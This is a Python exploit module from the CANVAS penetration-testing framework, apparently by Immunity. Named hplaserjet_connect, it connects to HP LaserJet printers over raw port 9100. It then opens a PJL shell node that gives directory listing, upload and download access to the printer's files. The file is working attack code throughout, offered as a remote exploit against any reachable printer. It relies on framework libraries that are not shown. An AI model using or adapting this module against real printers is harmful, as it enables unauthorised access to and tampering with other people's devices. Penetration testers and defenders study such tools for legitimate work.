#! /usr/bin/env python
"""
hplaserjet_connect - starts up a PJL node if successful.
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""
1.0 released.
"""


NOTES="""
Connect to a HP Laserjet Printer and return a Shell
"""


DOCUMENTATION={}
DOCUMENTATION['VENDOR']="HP"
DOCUMENTATION["Date public"]=""
DOCUMENTATION["Notes"]=NOTES
NAME="hplaserjet_connect"
DESCRIPTION="Connects to HP Printers and provides basic file access (dir/upload/download)"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["PCL" ] ]
PROPERTY['VERSION'] = ["All"]


import os,getopt,stat
import sys,struct
from StringIO import StringIO

if "." not in sys.path: sys.path.append(".")

        
import socket
from exploitutils import *
import time
from tcpexploit import tcpexploit
import canvasengine

from libs import pjllib
from Nodes import PJLNode

from MOSDEFShellServer import PJL as PJLShellServer


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port=9100
        self.setVersion(1)
        self.badstring=""
        self.db=""
        self.user=""
        self.password = "" 
        # You are invited to add more users here (for bruteforce mode):
        self.ssl=0
        self.name=NAME
        return

    def test(self):
        """
        Tests for vulns's presence. Prints out the version if
        found.
        """
        self.getargs()
        sock=self.gettcpsock()
        try:
            sock.connect()
        except:
            return 0
        self.log("Connected to remote printer - most likely HP")
        sock.close()
        return 1

    def getargs(self):
        self.host = self.target.interface
        self.getarg("port")
        return 
    
    def run(self):
        self.getargs()
        self.socknode=self.argsDict["passednodes"][0]
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME,self.host, self.port), showlog=1)
        ret=0
        error=""

        self.device=pjllib.PJLDevice(port=self.port)
        self.device.hostname = self.host
        #self.pjl.port = self.port
        self.log("Trying to connect to printer on %s:%d"%(self.host, self.port))
        result=self.device.connect()

        if not result:
            self.log("Error connecting to PJL device")
            self.setInfo("%s attacking %s:%d (failed)" % (NAME,self.host, self.port), showlog=1)            
            return 0
        
        self.log("Connected to PJL device.")

        self.setInfo("%s attacking %s:%d (success)" % (NAME,self.host, self.port), showlog=1)            
        node            = PJLNode.PJLNode()
        node.parentnode = self.socknode
        shell           = PJLShellServer.PJL(self.device, node, logfunction=self.logfunction)
                
        shell.startup()
        node.startup()
        return node
        

    def usage(self):
        print "Usage: %s -t target [-p port:9100 ]" % sys.argv[0]
    

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret:
        print "\o/"
        ret.interact()
